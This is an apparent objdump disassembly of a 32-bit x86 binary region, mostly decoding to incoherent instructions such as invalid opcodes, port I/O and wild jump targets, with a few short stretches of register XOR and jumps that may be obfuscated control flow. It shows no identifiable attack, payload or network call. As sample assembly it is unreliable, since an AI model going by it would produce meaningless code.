  41051f:	sbb    edi,edx
  410521:	ins    DWORD PTR es:[edi],dx
  410522:	ret    
  410523:	sahf   
  410524:	(bad)  
  410526:	je     0x41059c
  410528:	jmp    0xa9fbd0d0
  41052d:	jl     0x4104ba
  41052f:	lea    ebx,[esi+0x56de2c5f]
  410535:	mov    esp,0x3cb1a3a3
  41053a:	out    dx,al
  41053b:	and    DWORD PTR [ebx+0x5f],esp
  41053e:	daa    
  41053f:	and    eax,0xc7350d54
  410544:	ins    BYTE PTR es:[edi],dx
  410545:	fdiv   DWORD PTR [edx-0x43]
  410548:	cmp    dl,BYTE PTR [ecx+edi*4-0x17]
  41054c:	xchg   esp,eax
  41054d:	lds    esi,FWORD PTR [ebx*2+0x4c6e02b1]
  410554:	shl    al,1
  410556:	test   BYTE PTR [ecx-0x33],dh
  410559:	fsub   QWORD PTR [eax]
  41055b:	lea    esi,[ebp-0x6b]
  41055e:	fisttp QWORD PTR [edx+edi*2+0x58c3ea26]
  410565:	jg     0x410579
  410567:	mov    al,0xae
  410569:	imul   edx,edi
  41056c:	mov    edi,DWORD PTR [ebp-0x8]
  41056f:	mov    ebx,DWORD PTR [ebp-0x10]
  410572:	jmp    0x4107fa
  410577:	cmp    al,0xd6
  410579:	ret    0xdac3
  41057c:	fcmovnb st,st(1)
  41057e:	aad    0xe1
  410580:	pop    es
  410581:	adc    ah,BYTE PTR [ecx]
  410583:	dec    esi
  410584:	out    dx,al
  410585:	or     bl,bh
  410587:	cmp    DWORD PTR [ebx+0x78],edx
  41058a:	js     0x410571
  41058c:	jle    0x410606
  41058e:	js     0x410527
  410590:	sub    bl,BYTE PTR [ecx-0x58]
  410593:	sub    dh,bl
  410595:	cs inc ebp
  410597:	or     ecx,DWORD PTR [eax-0x7]
  41059a:	add    esi,DWORD PTR [eax]
  41059c:	std    
  41059d:	ja     0x410591
  41059f:	or     BYTE PTR [eax-0x5d],bl
  4105a2:	inc    ebx
  4105a3:	ja     0x41060f
  4105a5:	sbb    eax,0x7bbf249f
  4105aa:	sub    DWORD PTR [edi],eax
  4105ac:	div    esp
  4105ae:	dec    edx
  4105af:	mov    al,ds:0x8464cf5c
  4105b4:	mov    BYTE PTR [ebx],dh
  4105b6:	and    BYTE PTR [edx+0x71cb1475],ch
  4105bc:	add    eax,DWORD PTR [edi]
  4105be:	lods   al,BYTE PTR ds:[esi]
  4105bf:	sbb    al,0xd9
  4105c1:	mov    esi,ebx
  4105c3:	neg    DWORD PTR [ebx-0x5b]
  4105c6:	rcl    DWORD PTR ds:0x783d7256,cl
  4105cc:	imul   esi
  4105ce:	xchg   edi,eax
  4105cf:	in     al,dx
  4105d0:	mov    edi,0xd92bab96
  4105d5:	jmp    0x41057b
  4105d7:	hlt    
  4105d8:	(bad)  
  4105d9:	push   edx
  4105da:	not    DWORD PTR [eax-0xe93dc5]
  4105e0:	jl     0x410624
  4105e2:	xor    ebx,ebx
  4105e4:	mov    ss,ebp
  4105e6:	jae    0x410613
  4105e8:	pushf  
  4105e9:	pop    ecx
  4105ea:	(bad)  [ebx+0x6a]
  4105ed:	loop   0x4105ab
  4105ef:	cmp    al,0x53
  4105f1:	add    DWORD PTR [edi],edx
  4105f3:	hlt    
  4105f4:	aaa    
  4105f5:	sbb    BYTE PTR [eax+0x17],ah
  4105f8:	in     eax,0xff
  4105fa:	inc    eax
  4105fb:	mov    esi,DWORD PTR [ebx+0x17]
  4105fe:	cmp    BYTE PTR [eax],dl
  410600:	xlat   BYTE PTR ds:[ebx]
  410601:	adc    al,BYTE PTR cs:[edi+0x29]
  410605:	lock (bad) 
  410607:	sbb    DWORD PTR [ebx+0x1a860724],ebp
  41060d:	add    al,0xf9
  41060f:	push   eax
  410610:	ror    al,1
  410612:	scas   eax,DWORD PTR es:[edi]
  410613:	js     0x4105ee
  410615:	je     0x410655
  410617:	(bad)  
  410618:	lahf   
  410619:	ins    DWORD PTR es:[edi],dx
  41061a:	ds jge 0x41063a
  41061d:	or     eax,0x338f50e9
  410622:	in     eax,dx
  410623:	inc    ecx
  410624:	fdivrp st(5),st
  410626:	aad    0x6a
  410628:	or     al,0x64
  41062a:	pusha  
  41062b:	sbb    BYTE PTR [ebp-0x100074e3],dl
  410631:	add    eax,0x7b529c38
  410636:	outs   dx,BYTE PTR ds:[esi]
  410637:	cs xor ch,dl
  41063a:	outs   dx,DWORD PTR ds:[esi]
  41063b:	std    
  41063c:	mov    edx,DWORD PTR [ebp-0xa]
  41063f:	xor    eax,0xb47d395b
  410644:	mov    esp,0x1ecc7d9f
  410649:	dec    ebx
  41064a:	adc    eax,0xef4ed7e7
  41064f:	ss push 0xffffffc2
  410652:	jne    0x4106bc
  410654:	add    eax,0x74aa24f9
  410659:	inc    eax
  41065a:	jmp    FWORD PTR [ebx]
  41065c:	mov    cl,0x32
  41065e:	mov    ebp,0x5e8cd4a4
  410663:	lahf   
  410664:	dec    ecx
  410665:	mov    edi,0x1fc3e655
  41066a:	shl    dl,cl
  41066c:	neg    DWORD PTR [eax]
  41066e:	and    bl,BYTE PTR [ecx+eax*8]
  410671:	cli    
  410672:	outs   dx,BYTE PTR ds:[esi]
  410673:	cmp    BYTE PTR [edi-0xfce6da5],dh
  410679:	pop    esp
  41067a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41067b:	ins    BYTE PTR es:[edi],dx
  41067c:	mov    eax,0x78e7757
  410681:	lea    ebx,ds:0x6d670006
  410687:	cli    
  410688:	ret    0xaf23
  41068b:	(bad)  
  41068c:	sti    
  41068d:	fcomp  st(2)
  41068f:	sub    esp,0xffffffcc
  410692:	xchg   edi,eax
  410693:	mov    bl,0x5a
  410695:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410696:	popf   
  410697:	imul   BYTE PTR [ebp+0x562d514d]
  41069d:	(bad)  
  41069e:	test   DWORD PTR [edx+0x6],0x88c10800
  4106a5:	and    dh,ah
  4106a7:	mov    esi,0x72476754
  4106ac:	cli    
  4106ad:	mov    dh,0x26
  4106af:	ja     0x4106b1
  4106b1:	imul   edi,eax,0x9ee515c
  4106b7:	cmp    ch,bh
  4106b9:	push   ebp
  4106ba:	sub    eax,0xf7988faf
  4106bf:	add    al,0xc
  4106c1:	xor    cl,bl
  4106c3:	inc    eax
  4106c4:	in     eax,dx
  4106c5:	hlt    
  4106c6:	mov    ch,0x8a
  4106c8:	adc    DWORD PTR [edx],ebx
  4106ca:	jle    0x4106b7
  4106cc:	je     0x410697
  4106ce:	aas    
  4106cf:	repnz sub eax,0xbb6c916d
  4106d5:	and    ebx,eax
  4106d7:	std    
  4106d8:	neg    BYTE PTR [eax]
  4106da:	pusha  
  4106db:	cmp    eax,0x8a72bcb7
  4106e0:	iret   
  4106e1:	pop    esi
  4106e2:	pushf  
  4106e3:	xchg   BYTE PTR [edx-0x77ad2ae5],al
  4106e9:	or     edx,DWORD PTR [eax+0x7a]
  4106ec:	(bad)  
  4106ed:	jno    0x4106fc
  4106ef:	jecxz  0x41074f
  4106f1:	or     DWORD PTR [edi],esp
  4106f3:	sti    
  4106f4:	cmp    bl,BYTE PTR [esi-0x52da9c45]
  4106fa:	pop    ecx
  4106fb:	pop    eax
  4106fc:	jmp    0xd71f1032
  410701:	pop    es
  410702:	in     al,0xbb
  410704:	popa   
  410705:	jno    0x41076e
  410707:	push   0xde76a7e4
  41070c:	mov    dh,0x51
  41070e:	ins    DWORD PTR es:[edi],dx
  41070f:	jge    0x410716
  410711:	dec    ecx
  410712:	and    eax,0x4278cf74
  410717:	adc    DWORD PTR [eax],edx
  410719:	out    dx,eax
  41071a:	std    
  41071b:	jp     0x4106bf
  41071d:	enter  0x7e63,0x37
  410721:	lahf   
  410722:	imul   esi,ebx,0x929e1b53
  410728:	repnz mov edi,0x2f5ad82e
  41072e:	mov    eax,ds:0xa5386b94
  410733:	sub    edx,DWORD PTR [ebp-0x4]
  410736:	fcomp  QWORD PTR [edx-0x64]
  410739:	xchg   esi,eax
  41073a:	jbe    0x410708
  41073c:	(bad)  
  41073d:	mov    ebp,0x60375a94
  410742:	pop    ecx
  410743:	test   eax,0xf1841b60
  410748:	ret    0x6dc8
  41074b:	sbb    cl,BYTE PTR [ecx-0x2908ed02]
  410751:	loop   0x41072d
  410753:	sbb    ecx,edi
  410755:	sti    
  410756:	mov    dl,0xe0
  410758:	mov    ds:0x87c3ffea,eax
  41075d:	ds mov cl,0x85
  410760:	pop    ebp
  410761:	add    BYTE PTR [edx-0x743bc3fb],cl
  410767:	push   esi
  410768:	fcom   QWORD PTR [esi-0x61f73afc]
  41076e:	repnz test dh,ch
  410771:	mov    ds:0x8ad9df8c,eax
  410776:	jge    0x4107d5
  410778:	retf   0x4cd4
  41077b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41077c:	xchg   BYTE PTR [esp+edx*8],bh
  41077f:	scas   eax,DWORD PTR es:[edi]
  410780:	push   esp
  410781:	stos   BYTE PTR es:[edi],al
  410782:	mov    al,ds:0xa90cdff4
  410787:	push   0x2db6da03
  41078c:	pop    ecx
  41078d:	add    al,0xf5
  41078f:	lods   al,BYTE PTR ds:[esi]
  410790:	xor    dh,BYTE PTR [edi]
  410792:	imul   esi,esi,0x660eb8ed
  410798:	ret    
  410799:	out    dx,eax
  41079a:	mul    ebp
  41079c:	or     al,dl
  41079e:	stc    
  41079f:	stc    
  4107a0:	pop    esi
  4107a1:	mov    ds:0x78d51cd0,eax
  4107a6:	sub    al,0xa
  4107a8:	mov    ecx,0x2d426616
  4107ad:	retf   
  4107ae:	stos   BYTE PTR es:[edi],al
  4107af:	fwait
  4107b0:	pop    ss
  4107b1:	test   DWORD PTR [esi],esi
  4107b3:	or     edi,DWORD PTR [edi]
  4107b5:	and    eax,0x5f1a35c
  4107ba:	lods   eax,DWORD PTR ds:[esi]
  4107bb:	sub    edi,ebp
  4107bd:	cli    
  4107be:	dec    edi
  4107bf:	jmp    0x8f5fbcf1
  4107c4:	jbe    0x4107db
  4107c6:	push   es
  4107c7:	sbb    eax,0x9eaa5478
  4107cc:	ret    0xb36e
  4107cf:	shl    dl,0xb5
  4107d2:	in     eax,dx
  4107d3:	and    edx,edi
  4107d5:	add    al,0x8c
  4107d7:	add    BYTE PTR [eax-0x30],ch
  4107da:	xor    al,0xdb
  4107dc:	enter  0x475c,0x18
  4107e0:	stos   DWORD PTR es:[edi],eax
  4107e1:	imul   ebp,DWORD PTR [edx+0x30]
  4107e5:	in     al,dx
  4107e6:	pop    ss
  4107e7:	xor    ecx,DWORD PTR [esi-0x5b1cf48e]
  4107ed:	jl     0x4107fd
  4107ef:	loope  0x410849
  4107f1:	lds    ebp,FWORD PTR [edi]
  4107f3:	or     BYTE PTR [edi],bh
  4107f5:	cmp    edi,DWORD PTR [ebp+0x2b11f272]
  4107fb:	fistp  QWORD PTR [ebx]
  4107fd:	fucompp 
  4107ff:	add    DWORD PTR [edx],0x0
  410802:	add    dh,cl
  410804:	ror    ebx,0xc8
  410807:	fcmovnbe st,st(6)
  410809:	fld    st(1)
  41080b:	ud0    edi,esp
  41080e:	pop    ds
  41080f:	and    eax,0xa60bf7b4
  410814:	push   ecx
  410815:	js     0x41088f
  410817:	in     eax,0x7e
  410819:	js     0x410893
  41081b:	jecxz  0x41082e
  41081d:	jbe    0x4107be
  41081f:	push   ds
  410820:	inc    ebp
  410821:	adc    ah,ch
  410823:	push   es
  410824:	sti    
  410825:	(bad)  
  410826:	jecxz  0x4107ae
  410828:	mov    WORD PTR [edx+ecx*1-0x23],ds
  41082c:	das    
  41082d:	jo     0x410853
  41082f:	sub    BYTE PTR [esi-0x3a],dh
  410832:	ins    DWORD PTR es:[edi],dx
  410833:	into   
  410834:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410835:	dec    ebx
  410836:	data16 mov dl,ch
  410839:	jecxz  0x4108b5
  41083b:	push   ebx
  41083c:	and    esi,ebx
  41083e:	sbb    ebx,DWORD PTR [eax+0x3ee50b92]
  410844:	fsubr  st,st(0)
  410846:	mov    ebp,DWORD PTR [eax-0x34]
  410849:	popf   
  41084a:	jmp    0x8c02:0x95a9894e
  410851:	mov    edx,0x73e95bde
  410856:	cmp    BYTE PTR ds:0x30293a6f,cl
  41085c:	pop    ss
  41085d:	and    ch,BYTE PTR ss:[eax]
  410860:	mov    DWORD PTR [edi-0x3cba4e10],esi
  410866:	inc    edx
  410867:	inc    edi
  410868:	cwde   
  410869:	test   al,0x21
  41086b:	lock jge 0x41084f
  41086e:	ins    DWORD PTR es:[edi],dx
  41086f:	sbb    bh,BYTE PTR [eax]
  410871:	shr    ebp,cl
  410873:	push   0x19d39140
  410878:	test   eax,0x4936313c
  41087d:	das    
  41087e:	inc    esi
  41087f:	ret    0xe382
  410882:	cdq    
  410883:	ror    DWORD PTR [ecx+0x2c],1
  410886:	sub    eax,0x9a4d44e1
  41088b:	or     BYTE PTR [eax+0x21b8b9a0],0xf0
  410892:	stc    
  410893:	mov    BYTE PTR [eax+esi*8+0x63378cc6],0x6
  41089b:	aas    
  41089c:	inc    esp
  41089d:	mov    ebx,0xa45811e
  4108a2:	out    dx,al
  4108a3:	aam    0xdb
  4108a5:	fild   DWORD PTR [esi+0x396c26e3]
  4108ab:	es add eax,0x7b6cd037
  4108b1:	aas    
  4108b2:	pop    ds
  4108b3:	shl    ch,1
  4108b5:	sti    
  4108b6:	pop    ecx
  4108b7:	(bad)  
  4108b8:	pop    edx
  4108b9:	mov    DWORD PTR [eax-0x76],eax
  4108bc:	xor    al,BYTE PTR [edi]
  4108be:	je     0x41093e
  4108c0:	clc    
  4108c1:	xor    BYTE PTR [esi+0x1a],0x15
  4108c5:	pop    edx
  4108c6:	mov    BYTE PTR [ecx],bl
  4108c8:	test   eax,0xba0d623a
  4108cd:	xor    al,0x3d
  4108cf:	mov    cl,bh
  4108d1:	or     bh,BYTE PTR [ebp+edi*4-0x49]
  4108d5:	inc    esp
  4108d6:	push   edx
  4108d7:	(bad)  
  4108d8:	loop   0x4108d5
  4108da:	push   edi
  4108db:	cmp    BYTE PTR [eax-0x58],ch
  4108de:	test   eax,0x1e7ef63b
  4108e3:	outs   dx,DWORD PTR ds:[esi]
  4108e4:	test   DWORD PTR [ebp+0x23],esp
  4108e7:	xor    al,0xb2
  4108e9:	mov    esp,0x8751c71c
  4108ee:	xchg   edi,eax
  4108ef:	fnstsw WORD PTR [edx-0x25f59287]
  4108f5:	loope  0x41096b
  4108f7:	gs aaa 
  4108f9:	cmp    ah,dh
  4108fb:	retf   
  4108fc:	mov    eax,0x178ad65a
  410901:	push   edx
  410903:	out    0xd7,eax
  410905:	add    bl,BYTE PTR [ecx]
  410907:	repnz aam 0xd7
  41090a:	pop    ecx
  41090b:	and    ch,BYTE PTR [ebp+edi*4-0x7117923e]
  410912:	inc    ecx
  410913:	adc    dl,BYTE PTR [ecx]
  410915:	pop    ds
  410916:	bnd data16 je 0x410934
  41091a:	jo     0x4108a3
  41091c:	or     al,BYTE PTR [ebx-0x48]
  41091f:	mov    ch,0x77
  410921:	sub    eax,0x6305e1f8
  410926:	(bad)  
  410928:	or     BYTE PTR [esi+0x2],ah
  41092b:	xchg   ebx,eax
  41092c:	xchg   DWORD PTR [edi+0x5c],ebp
  41092f:	dec    ebp
  410930:	dec    eax
  410931:	jo     0x41094e
  410933:	ins    DWORD PTR es:[edi],dx
  410934:	mov    dl,0xf4
  410936:	fidiv  DWORD PTR [ebx]
  410938:	call   0x2404:0xb5bc861a
  41093f:	daa    
  410940:	xchg   DWORD PTR [edx+0x5a],edx
  410943:	ror    DWORD PTR [eax],cl
  410945:	aas    
  410946:	cmp    ebx,DWORD PTR ds:0x1c6bdfea
  41094c:	sbb    ecx,esi
  41094e:	sbb    ebp,0x3d
  410951:	cmp    DWORD PTR [edi],edi
  410953:	repz iret 
  410955:	test   al,0xa8
  410957:	ficomp WORD PTR cs:[esi+0x34306b53]
  41095e:	xlat   BYTE PTR ds:[ebx]
  41095f:	dec    eax
  410960:	(bad)  
  410961:	out    dx,al
  410962:	pop    edx
  410963:	clc    
  410964:	and    al,0xc8
  410966:	xor    eax,0xc134dc8d
  41096b:	lock stos DWORD PTR es:[edi],eax
  41096d:	mov    ds:0xfe6208c8,eax
  410972:	inc    esi
  410973:	loopne 0x410983
  410975:	mov    ecx,0x8c253b0
  41097a:	sti    
  41097b:	sub    edi,ebx
  41097d:	push   0x56c92b4b
  410982:	fisub  DWORD PTR [ebp+edi*4-0x55]
  410986:	fisttp WORD PTR [ebx]
  410988:	add    BYTE PTR [edi+0x2660b83f],cl
  41098e:	leave  
  41098f:	shl    DWORD PTR [ecx-0x6d0f34c1],0x93
  410996:	inc    esi
  410997:	and    cl,BYTE PTR [ecx-0x7f]
  41099a:	sub    BYTE PTR [edx],al
  41099c:	les    ebx,FWORD PTR [esi-0x7d]
  41099f:	sbb    DWORD PTR [edi-0x52],ecx
  4109a2:	sub    bl,dl
  4109a4:	mov    ebp,0x5e87eb30
  4109a9:	mov    dl,0xc0
  4109ab:	ja     0x410971
  4109ad:	push   ss
  4109ae:	mov    ebp,0xa00b157f
  4109b3:	cmp    ecx,DWORD PTR [edx]
  4109b5:	call   0x2c96:0x59c9f5ef
  4109bc:	lock pop esp
  4109be:	mov    ecx,0x9ac99ad9
  4109c3:	inc    ecx
  4109c4:	ja     0x410a36
  4109c6:	int    0x82
  4109c8:	repz jmp 0xa4df5c1e
  4109ce:	lods   al,BYTE PTR ds:[esi]
  4109cf:	push   esp
  4109d0:	cmc    
  4109d1:	es dec ecx
  4109d3:	push   eax
  4109d4:	xchg   esi,eax
  4109d5:	cld    
  4109d6:	test   BYTE PTR [ebx-0x25ba1d08],dh
  4109dc:	mov    ds:0x3a86b50,eax
  4109e1:	push   ebx
  4109e2:	fdivr  QWORD PTR [ecx]
  4109e4:	mov    ebp,fs
  4109e6:	sar    bh,1
  4109e8:	xchg   ebx,eax
  4109e9:	add    ecx,DWORD PTR [edi-0x65246ae1]
  4109ef:	sub    esp,DWORD PTR [ecx+0x11]
  4109f2:	sbb    al,0x9b
  4109f4:	sub    al,0x44
  4109f6:	xor    ebx,0x6435da66
  4109fc:	retf   
  4109fd:	xchg   edx,eax
  4109fe:	push   0xffffffeb
  410a00:	cdq    
  410a01:	out    0xd2,al
  410a03:	(bad)  
  410a04:	fisttp DWORD PTR [eax-0x74]
  410a07:	and    eax,0xb4fabc79
  410a0c:	add    DWORD PTR [eax-0x70],ebx
  410a0f:	jmp    0x4109ae
  410a11:	and    BYTE PTR [edi+0x12],dh
  410a14:	cs fxch st(1)
  410a17:	jp     0x4109f6
  410a19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a1a:	xlat   BYTE PTR ds:[ebx]
  410a1b:	in     al,0x50
  410a1d:	ret    
  410a1e:	adc    esi,ecx
  410a20:	xlat   BYTE PTR ds:[ebx]
  410a21:	adc    ebp,DWORD PTR ds:0x20ca2e0f
  410a27:	sbb    DWORD PTR [eax+0x61],esi
  410a2a:	repz enter 0xcc6b,0x26
  410a2f:	test   cl,ah
  410a31:	or     eax,DWORD PTR [eax+edi*8+0x63]
  410a35:	or     al,0x2b
  410a37:	xor    eax,0xc68a9b20
  410a3c:	sbb    edi,DWORD PTR [esi+0x59]
  410a3f:	rcr    DWORD PTR [edi+0x152b9404],0xf2
  410a46:	and    eax,0xcf37418b
  410a4b:	jmp    0x656fa1d0
  410a50:	jno    0x410a24
  410a52:	push   esi
  410a53:	jmp    0x410a92
  410a55:	push   esp
  410a56:	lock out dx,al
  410a58:	int3   
  410a59:	mov    ch,0xd
  410a5b:	cmp    esi,DWORD PTR [ecx+ecx*2-0x29]
  410a5f:	and    ebx,edi
  410a61:	pop    eax
  410a62:	adc    BYTE PTR [edx-0x52],ch
  410a65:	mov    DWORD PTR [edx+0x34],esp
  410a68:	(bad)  
  410a69:	mov    esp,0x7029bc7
  410a6e:	cld    
  410a6f:	sbb    DWORD PTR [esi+ebx*2],0xc2fd744
  410a76:	push   ss
  410a77:	inc    esi
  410a78:	rcl    BYTE PTR [ecx+0x4b],0x50
  410a7c:	aaa    
  410a7d:	shr    BYTE PTR [edx],0x35
  410a80:	mov    al,0x68
  410a82:	in     al,dx
  410a83:	fs and ecx,eax
  410a86:	ja     0x410a94
  410a8c:	mov    edx,DWORD PTR [ebp-0x28]
  410a8f:	jmp    0x411f76
  410a94:	mov    edx,DWORD PTR [ebp-0x30]
  410a97:	mov    edi,DWORD PTR [ebp-0x4]
  410a9a:	xor    edx,eax
  410a9c:	xor    edi,eax
  410a9e:	jmp    0x410d26
  410aa3:	aas    
  410aa4:	retf   
  410aa5:	iret   
  410aa6:	(bad)
  410aa9:	aad    0xc9
  410aab:	jo     0x410a57
  410aad:	lods   eax,DWORD PTR ds:[esi]
  410aae:	test   ecx,0x13373e30
  410ab4:	push   esi
  410ab5:	js     0x410b2f
  410ab7:	in     eax,0x7e
  410ab9:	js     0x410b33
  410abb:	es in  al,dx
  410abd:	int3   
  410abe:	xor    eax,0x983c4598
  410ac3:	pop    ecx
  410ac4:	fsub   st,st(7)
  410ac6:	popa   
  410ac7:	test   eax,edx
  410ac9:	mov    al,ds:0xd329f7df
  410ace:	jecxz  0x410af4
  410ad0:	leave  
  410ad1:	push   0xe8bfe1d9
  410ad6:	push   cs
  410ad7:	popa   
  410ad8:	inc    ebp
  410ad9:	mov    cl,0xc
  410adb:	cwde   
  410adc:	jp     0x410a88
  410ade:	test   al,0xdc
  410ae0:	jmp    0x1a04a810
  410ae5:	sahf   
  410ae6:	clc    
  410ae7:	push   cs
  410ae8:	inc    esp
  410ae9:	cld    
  410aea:	aad    0x54
  410aec:	xor    dl,dh
  410aee:	arpl   WORD PTR [esi],sp
  410af0:	out    dx,eax
  410af1:	jmp    0x8d4efdb1
  410af6:	lea    esi,[edx]
  410af8:	hlt    
  410af9:	xor    esi,DWORD PTR [edi+0x67]
  410afc:	mov    ah,ah
  410afe:	pop    ebp
  410aff:	fldenv [ecx+0x2e]
  410b02:	xchg   ecx,eax
  410b03:	out    0x85,al
  410b05:	jbe    0x410a8f
  410b07:	and    al,0xab
  410b09:	mov    esp,0x33d0bda7
  410b0e:	ror    BYTE PTR [edx-0x7d189c2b],cl
  410b14:	aas    
  410b15:	das    
  410b16:	sar    BYTE PTR [edx-0x5f0805b7],0xe1
  410b1d:	call   0x4eba933b
  410b22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b23:	out    0x39,al
  410b25:	test   eax,0xfb5c288d
  410b2a:	xor    esi,esp
  410b2c:	outs   dx,BYTE PTR ds:[esi]
  410b2d:	cmp    al,0xf0
  410b2f:	or     eax,0x3fc7abed
  410b34:	nop
  410b35:	push   ebx
  410b36:	mov    bh,BYTE PTR [edi-0x1b68ecd9]
  410b3c:	leave  
  410b3d:	push   esp
  410b3e:	mov    DWORD PTR [ebx-0x42073af2],eax
  410b44:	fsub   DWORD PTR [ebx+0x27]
  410b47:	mov    ds:0x60de98ba,al
  410b4c:	pop    esp
  410b4d:	test   eax,0xb03590d
  410b52:	retf   0x5712
  410b55:	mov    al,cl
  410b57:	and    eax,0xf502789b
  410b5c:	pop    ss
  410b5d:	(bad)  [edx+0x67]
  410b60:	sub    esp,DWORD PTR [ebx+0x3d1938e1]
  410b66:	push   ebp
  410b67:	adc    BYTE PTR [esp+ebx*1+0x65],dh
  410b6b:	aad    0x5f
  410b6d:	aaa    
  410b6e:	push   0x19
  410b70:	sub    esp,ebp
  410b72:	inc    edi
  410b73:	(bad)  
  410b74:	aaa    
  410b75:	inc    ebx
  410b76:	es cmp al,0x1f
  410b79:	sub    cl,BYTE PTR [ebx+esi*4-0x29]
  410b7d:	dec    ebp
  410b7e:	in     eax,dx
  410b7f:	lods   eax,DWORD PTR ds:[esi]
  410b80:	imul   ebx,eax,0x2
  410b83:	adc    BYTE PTR [edx+0x60],dl
  410b86:	fsub   st(5),st
  410b88:	(bad)  
  410b89:	leave  
  410b8a:	fwait
  410b8b:	sub    eax,0x865442f3
  410b90:	cli    
  410b91:	fisub  DWORD PTR [edi]
  410b93:	out    dx,eax
  410b94:	(bad)  
  410b95:	out    0xf7,al
  410b97:	aaa    
  410b98:	or     eax,0xecc231f4
  410b9d:	push   0x6cc30c76
  410ba2:	mov    cl,0x74
  410ba4:	xchg   esp,eax
  410ba5:	jp     0x410b39
  410ba7:	or     bl,BYTE PTR [ebx-0x2102f1c6]
  410bad:	ds mov edx,0x6b9f8dc9
  410bb3:	push   esp
  410bb4:	les    eax,FWORD PTR [ecx+edx*2]
  410bb7:	xor    ch,BYTE PTR [ecx+0x11]
  410bba:	jle    0x410b74
  410bbc:	xchg   ecx,eax
  410bbd:	and    ch,bl
  410bbf:	jae    0x410b97
  410bc1:	call   0xc218807d
  410bc6:	fldenv [edi-0x6220c5b6]
  410bcc:	cli    
  410bcd:	pop    edx
  410bce:	mov    dh,0xa8
  410bd0:	cli    
  410bd1:	(bad)  
  410bd2:	jno    0x410be4
  410bd4:	call   0x7a3fc65f
  410bd9:	outs   dx,DWORD PTR ds:[esi]
  410bda:	jb     0x410bc6
  410bdc:	jmp    FWORD PTR ds:0xfc8617e7
  410be2:	fmul   QWORD PTR [edx]
  410be4:	or     DWORD PTR [eax],0x59961f2b
  410bea:	cmp    bl,BYTE PTR [ecx]
  410bec:	mov    eax,ds:0x861b430d
  410bf1:	fnstcw WORD PTR ds:[ebp+0x64]
  410bf5:	mov    esi,0xd5807066
  410bfa:	leave  
  410bfb:	inc    edi
  410bfc:	mov    dl,0xf1
  410bfe:	or     DWORD PTR [edx-0x58],ebx
  410c01:	mov    ah,0x17
  410c03:	adc    dl,al
  410c05:	add    BYTE PTR [ebp+0x79],dl
  410c08:	mov    bh,dl
  410c0a:	push   ebx
  410c0b:	pop    ds
  410c0c:	xchg   edi,eax
  410c0d:	push   esi
  410c0e:	outs   dx,BYTE PTR ds:[esi]
  410c0f:	mov    ecx,0x5b79ffda
  410c14:	pusha  
  410c15:	(bad)  
  410c16:	popa   
  410c17:	fstp   TBYTE PTR [edi+0x3e18f5f9]
  410c1d:	mov    ?,WORD PTR [edi-0x5c7955f6]
  410c23:	int3   
  410c24:	fcmovnb st,st(5)
  410c26:	ror    DWORD PTR [esi+0x43a04884],1
  410c2c:	js     0x410c1d
  410c2e:	mov    ch,0xd9
  410c30:	mov    eax,ds:0xe42cba94
  410c35:	(bad)  
  410c36:	xchg   edi,eax
  410c37:	xchg   esp,eax
  410c38:	mov    edi,0xc6258784
  410c3d:	jecxz  0x410cb6
  410c3f:	mov    edi,0xc3f5ecc3
  410c44:	or     BYTE PTR [edi],0xb3
  410c47:	mov    ds,WORD PTR [eax+0x33]
  410c4a:	dec    ebx
  410c4b:	mov    DWORD PTR [ebp+0x321fc81f],ebx
  410c51:	js     0x410c1d
  410c53:	xor    esi,DWORD PTR [ebx+0x39631518]
  410c59:	or     BYTE PTR [eax],cl
  410c5b:	mov    cl,0x2b
  410c5d:	adc    dh,BYTE PTR [edi+0x62e83084]
  410c63:	pusha  
  410c64:	xchg   BYTE PTR [edx+0x4eca4858],al
  410c6a:	ds (bad) 
  410c6d:	rcr    DWORD PTR [edx+0x71],1
  410c70:	aad    0x55
  410c72:	or     al,0x4e
  410c74:	jne    0x410c38
  410c76:	push   0xcc757878
  410c7b:	lock repnz es (bad) ds:[ebx+eiz*8-0x38359ac3]
  410c86:	add    eax,0xdcc7a863
  410c8b:	loopne 0x410c67
  410c8d:	outs   dx,DWORD PTR ds:[esi]
  410c8e:	jge    0x410c7a
  410c90:	and    al,0xa2
  410c92:	div    DWORD PTR [edi]
  410c94:	mov    ah,0x85
  410c96:	jle    0x410ca3
  410c98:	jns    0x410cf0
  410c9a:	ror    DWORD PTR [edx-0x33d57416],0x8d
  410ca1:	sti    
  410ca2:	cmp    eax,0x26721243
  410ca7:	or     al,0x13
  410ca9:	lods   eax,DWORD PTR ds:[esi]
  410caa:	push   cs
  410cab:	pop    eax
  410cac:	int    0xe9
  410cae:	pop    edi
  410caf:	test   eax,0x6d5f7388
  410cb4:	xchg   BYTE PTR [ebx],dl
  410cb6:	and    dl,bh
  410cb8:	push   eax
  410cb9:	dec    edx
  410cba:	nop
  410cbb:	loopne 0x410c70
  410cbd:	out    0x8d,al
  410cbf:	fsubr  st(4),st
  410cc1:	mov    fs:0xcec91bb2,eax
  410cc7:	sbb    DWORD PTR ds:0xa249ba7c,esp
  410ccd:	mov    ebx,DWORD PTR [ebp+edi*4+0x5a]
  410cd1:	dec    ebx
  410cd2:	test   BYTE PTR [edi-0x551cc8b1],al
  410cd8:	xor    DWORD PTR [eax+ebp*2-0x7ab0d52a],0xa3ad550e
  410ce3:	mov    BYTE PTR [esi+0x4],ah
  410ce6:	mov    edx,0xd5bc1d88
  410ceb:	xor    BYTE PTR ds:0xc870a3b1,0xba
  410cf2:	add    al,0xbb
  410cf4:	mov    edx,0x5af42973
  410cf9:	nop
  410cfa:	xchg   esp,eax
  410cfb:	pusha  
  410cfc:	std    
  410cfd:	int3   
  410cfe:	outs   dx,BYTE PTR ds:[esi]
  410cff:	loopne 0x410cd4
  410d01:	pop    esp
  410d02:	sti    
  410d03:	(bad)  
  410d04:	or     bl,bh
  410d06:	mov    bl,0x87
  410d08:	xlat   BYTE PTR ds:[ebx]
  410d09:	jb     0x410d02
  410d0b:	jmp    0x410cb3
  410d0d:	xor    ebx,esi
  410d0f:	ficom  WORD PTR [edx]
  410d11:	pushf  
  410d12:	dec    ebp
  410d13:	sub    eax,0x5c6f3b8a
  410d18:	mov    dl,0x15
  410d1a:	jnp    0x410cbf
  410d1c:	and    ecx,DWORD PTR [ebx-0x54]
  410d1f:	shr    DWORD PTR [edx+edx*4+0x3b],1
